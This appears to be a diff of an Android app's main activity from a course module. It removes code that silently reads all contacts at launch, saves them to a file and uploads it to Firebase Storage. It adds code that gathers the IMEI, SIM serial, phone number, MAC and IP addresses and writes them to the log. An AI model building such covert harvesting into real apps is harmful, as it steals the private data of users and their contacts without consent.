@@ -1,131 +1,98 @@
 package com.example.Modul6;
 
+import android.Manifest;
+import android.annotation.SuppressLint;
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
+import android.os.Build;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
-import android.content.ContentResolver;
-import android.database.Cursor;
-import android.net.Uri;
-import android.os.Environment;
-import android.provider.ContactsContract;
-
-import android.os.Bundle;
-import android.util.Log;
-import android.widget.Toast;
-
-import com.google.android.gms.tasks.OnFailureListener;
-import com.google.android.gms.tasks.OnSuccessListener;
-import com.google.firebase.storage.FirebaseStorage;
-import com.google.firebase.storage.StorageReference;
-import com.google.firebase.storage.UploadTask;
-
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
-import java.io.FileWriter;
-import java.io.IOException;
-import java.io.InputStream;
-import java.text.SimpleDateFormat;
-import java.util.Date;
+import java.net.Inet4Address;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.util.Collections;
+import java.util.List;
+import java.util.Locale;
 
 public class MainActivity extends AppCompatActivity {
 
-    File file;
+    private static final int PERMISSION_REQUEST_CODE = 1;
+
+    private TelephonyManager telephonyManager;
+    private WifiManager wifiManager;
+
+    private String imei, imeiSIM, phoneNumber, networkOperator, macAddress, ipAddress, androidVersion;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        setFileName();
-        getContact();
-        uploadFirebase();
-
+        // Check if the app has permission to access device information
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
+                != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[] { Manifest.permission.READ_PHONE_STATE },
+                    PERMISSION_REQUEST_CODE);
+        } else {
+            // Permission is granted, proceed to get device information
+            getDeviceInfo();
+        }
     }
 
-    private void setFileName() {
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
-        String currentTime = sdf.format(new Date());
-        String fileName = "contacts"+currentTime+".txt";
-        // Define the file name and path
-        File downloadsDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-        file = new File(downloadsDirectory, fileName);
-    }
+    @SuppressLint({"MissingPermission", "HardwareIds"})
+    private void getDeviceInfo() {
+        // Get device information
+        telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
-    private void getContact() {
-        // Get the content resolver
-        ContentResolver resolver = getContentResolver();
-
-        // Define the projection (fields to retrieve)
-        String[] projection = new String[] {
-                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                ContactsContract.CommonDataKinds.Phone.NUMBER
-        };
-
-        // Define the selection (filter)
-        String selection = ContactsContract.CommonDataKinds.Phone.NUMBER + " IS NOT NULL";
-        String[] selectionArgs = null;
-
-        // Define the sort order
-        String sortOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
-
-        // Query the contacts
-        Cursor cursor = resolver.query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                projection,
-                selection,
-                selectionArgs,
-                sortOrder
-        );
-
-
-        // Open the file for writing
-        try {
-            FileWriter writer = new FileWriter(file);
-
-            // Iterate over the cursor to retrieve the contacts
-            while (cursor.moveToNext()) {
-                // Retrieve the contact name and phone number
-                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-
-                // Do something with the contact name and phone number
-                Log.d("getContact", "Name: " + name + ", Phone: " + phone);
-                // Write the contact name and phone number to the file
-                writer.write(name + ", " + phone + "\n");
-            }
-
-            // Close the file writer
-            writer.close();
-            // Close the cursor
-            cursor.close();
-        } catch (IOException e) {
-            e.printStackTrace();
+        if (telephonyManager != null) {
+            imei = telephonyManager.getDeviceId();
+            imeiSIM = telephonyManager.getSimSerialNumber();
+            phoneNumber = telephonyManager.getLine1Number();
+            networkOperator = telephonyManager.getNetworkOperatorName();
         }
 
+        // Get MAC address
+        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+        macAddress = wifiInfo.getMacAddress();
 
-    }
+        // Get IP address
+        try {
+            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
+            for (NetworkInterface iface : interfaces) {
+                List<InetAddress> addresses = Collections.list(iface.getInetAddresses());
+                for (InetAddress addr : addresses) {
+                    if (addr instanceof Inet4Address) {
+                        if (!addr.isLoopbackAddress()) {
+                            ipAddress = addr.getHostAddress();
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e("IP Address", "Unable to get IP address: " + e.getMessage());
+        }
 
-    private void uploadFirebase() {
-        FirebaseStorage storage = FirebaseStorage.getInstance();
-        // Create a storage reference from our app
-        StorageReference storageRef = storage.getReference();
-        // Create a reference to the file you want to upload
-        StorageReference fileRef = storageRef.child(file.getName());
+        // Get Android version
+        androidVersion = Build.VERSION.RELEASE;
 
-        String filePath = file.getPath();
-        Uri fileUri = Uri.fromFile(new File(filePath));
+        // Print device information
+        Log.d("DeviceInfo", "IMEI: " + imei);
+        Log.d("DeviceInfo", "IMEI SIM: " + imeiSIM);
+        Log.d("DeviceInfo", "Phone number: " + phoneNumber);
+        Log.d("DeviceInfo", "Network operator: " + networkOperator);
+        Log.d("DeviceInfo", "MAC address: " + macAddress);
+        Log.d("DeviceInfo", "IP address: " + ipAddress);
+        Log.d("DeviceInfo", "Android version: " + androidVersion);
 
-
-        // Upload file to Firebase Storage
-        fileRef.putFile(fileUri)
-                .addOnSuccessListener(taskSnapshot -> {
-                    // File uploaded successfully
-                    Log.d("uploadFirebase", "File uploaded successfully");
-                })
-                .addOnFailureListener(e -> {
-                    // Handle unsuccessful uploads
-                    Log.e("uploadFirebase", "Error uploading file", e);
-                });
-    }
-}
+    }}
